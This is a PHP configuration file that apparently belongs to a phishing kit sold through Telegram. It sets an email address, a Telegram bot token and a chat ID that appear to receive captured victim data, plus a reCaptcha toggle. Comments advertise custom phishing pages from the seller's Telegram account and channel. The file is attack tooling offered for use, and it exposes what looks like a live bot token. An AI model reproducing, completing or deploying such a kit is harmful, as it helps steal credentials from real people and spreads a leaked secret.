<?php

$email = "emaioo.com"; // Email

$botToken = "8078844260:AAG_AUKrA4uXsfTSUqqrgjPzracC8g_UhHc"; // token
$chatId = "-4858246731"; // chatid

$reCaptcha = 'on'; // ( on / off ) Turn reCaptcha off if u want


// Want custom page ? contact me here 👇🏻👇🏻

// 💓 TELEGRAM  : @mr_coder_x1 💓


//---- CONTACT US NOW 👇🏻  ----
//✨ TELEGRAM:  https://t.me/mr_coder_x1
//—————————————————
//📌 Join Our New Channel : https://t.me/channelmrcoderx